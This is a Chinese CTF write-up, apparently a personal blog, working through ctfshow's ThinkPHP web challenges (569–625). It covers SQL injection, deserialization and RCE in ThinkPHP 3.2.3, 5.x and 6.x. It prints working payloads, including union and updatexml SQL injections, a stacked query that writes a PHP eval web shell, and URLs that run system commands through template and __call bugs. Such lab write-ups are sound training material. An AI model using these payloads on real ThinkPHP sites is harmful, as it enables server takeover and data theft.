---
title: ctfshow web入门(thinkphp专题)
categories: ctfshow
---

# 569 URL模式
![](https://img-blog.csdnimg.cn/42abd33294b94f0fbd71e7cad82f724b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
查阅手册：[URL模式 · ThinkPHP3.2.3完全开发手册](https://www.kancloud.cn/manual/thinkphp/1697)
```
http://serverName/index.php/模块/控制器/操作
```

<!--more-->
payload: 
```
普通模式：/?m=Admin&c=Login&a=ctfshowLogin
Pathinfo模式：/index.php/Admin/Login/ctfshowLogin
兼容模式：/?s=/Admin/Login/ctfshowLogin
```

# 570 路由
发现路由：

![](https://img-blog.csdnimg.cn/fee6480bb0fb4021b66f3d2fe546576c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

根据手册：
![](https://img-blog.csdnimg.cn/9d254a053288459f977a73f00b92fe60.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

直接构造：这里直接执行不可以，执行两次

![](https://img-blog.csdnimg.cn/81f723f20b4b44018b75c9236241a167.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

# 571 黑客建立了控制器后门
[Thinkphp3.2.3安全开发须知](https://www.cnblogs.com/devi1/p/13486655.html)

[show 方法参数可控](http://www.yongsheng.site/2022/01/09/ThinkPHP%20show%E6%96%B9%E6%B3%95%E5%8F%82%E6%95%B0%E5%8F%AF%E6%8E%A7%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/)

# 572 日志路径
Thinkphp3 日志路径

```
/Application/Runtime/Logs/Home/21_04_15.log
```

# 573-574 v3.2.3 find sql注入
```
/?id[where]=1 and updatexml(1,concat(0x7e,right((select group_concat(flag4s) from flags),22),0x7e),1)

?id=-1) union select 1,group_concat(flag4s),3,4 from flags%23
```

# web575
[ThinkPHP 3.2.3 反序列化&sql注入漏洞分析](http://www.yongsheng.site/2021/08/30/ThinkPHP3.2.3%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)

先利用恶意数据库读取题目中使用的数据库信息

![](https://img-blog.csdnimg.cn/e8244c68d5d04de782a3301db3eb2902.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

修改exp

```
"table" => "ctfshow_users where 1=2;select \"<?php eval(\$_POST[0]);?>\" into outfile \"/var/www/html/1.php\"#",
```

# 576 
[comment 注释注入写shell](http://www.yongsheng.site/2022/01/09/ThinkPHP%20v3.2%20comment%20%E6%B3%A8%E9%87%8A%E6%B3%A8%E5%85%A5%20%E5%86%99shell/)

# Web577
Thinkphp3.2.3 exp注入
```
?id[0]=exp&id[1]==-1 union select 1,group_concat(flag4s),3,4 from flags
```

# web578
变量覆盖导致rce
```
public function index($name='',$from='ctfshow'){
$this->assign($name,$from);
$this->display('index');
}
```
跟那个ThinkPHP 3.2.x RCE 差不多

分析这个`assign两个参数可控`

![](https://img-blog.csdnimg.cn/3304d7962e7e4ca290f8a1dbc2f3b4d8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

进入display再进入fetch方法，题目用的时php模板

![](https://img-blog.csdnimg.cn/8d8741371f6e4d5aa07829ccdc7c6156.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

extract直接覆盖变量$_content

那就在assign有两条路，传入的是字符串或者直接传入数组形式

payload:
```
?name=_content&from=<?php system('cat /fl*');?>
或者
?name[_content]=<?php phpinfo();?>&from=123
```

那个3.2.3rce的是在Think模板下，这道题在分析相较简单


# Web579-610 TP5 rce
开始thinkphp5 rce

payload一大堆

# web606
前几个题找几个payload就行了，到这一道题 input write invokefunction display被过滤，但是`大写`就绕过了

一个新的通杀:
```
/?s=index/\think\view\driver\Think/__call&method=display&params[]=<?php system('whoami'); ?>
```

![](https://img-blog.csdnimg.cn/2af3379b6b45455eb8c473f5d035e298.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

生成shell拼接道$content进行write写入缓存文件

![](https://img-blog.csdnimg.cn/29e1a39a7d734394b73598cb92346bf5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

![](https://img-blog.csdnimg.cn/3fee18bc900f4c2eacee580cd21e7cd8.png#pic_center)

接着去读取，include模板缓存文件

![](https://img-blog.csdnimg.cn/f29cbb2c61d64cd08d79372209f63582.png#pic_center)
![](https://img-blog.csdnimg.cn/bed87652227f4ae88f9901235b4c01cf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
# 611 TP 5.1 反序列化
thinkphp 5.1.38反序列化RCE

[ThinkPHP v5.1.x 反序列化 分析](http://www.yongsheng.site/2022/01/04/ThinkPHP%20v5.1.x%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E5%88%86%E6%9E%90/)

[安洵杯 | Y0ng的博客](http://www.yongsheng.site/2021/11/29/%E5%AE%89%E6%B4%B5%E6%9D%AF/)

# 612-622 5.1变形
从这道题往后就是 `围绕怎么调用input函数或者param来做文章` ，直接搜索谁调用input，然后进行分析即可

调用 `param` 的：

![](https://img-blog.csdnimg.cn/3b3838c3107a4ab6803c32ecd605b5c9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

```
'var_pjax'         => '',
$this->hook = ['visible'=>[$this,"isPjax"]];
```

![](https://img-blog.csdnimg.cn/5e750a42b16d4bf4ae0feb7b1e30f01e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
```
$this->get = ['y0ng'=>'whoami'];
$this->hook = ['visible'=>[$this,"__get"]];
```

调用 `input` 的：

![](https://img-blog.csdnimg.cn/f40c380fe2bd430d8e0244967d691a7e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
```
$this->hook = ['visible'=>[$this,"request"]];  直接url传参数即可
```

![](https://img-blog.csdnimg.cn/a73882e6f2f14fc888f79cbbe47ce44d.png#pic_center)
```
$this->route = ['y0ng'=>'whoami'];
$this->hook = ['visible'=>[$this,"route"]];
```

![](https://img-blog.csdnimg.cn/c7621f5e06b445128c4e1dd7a8f53385.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

![](https://img-blog.csdnimg.cn/cd802811520740528d9fee55be6998ca.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

# 623-625 TP6 反序列化

有个奇怪的地方，题目显示的是6.0.8 但是应该是打不通的，所以题目版本应该错了，用6.0.3就可以了

[ThinkPHP v6.0.x 反序列化漏洞 分析](http://www.yongsheng.site/2021/11/25/ThinkPHP%206.0.x%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/)

用6.0.9链子 有两种 一种直接eval 或者 还可以写文件

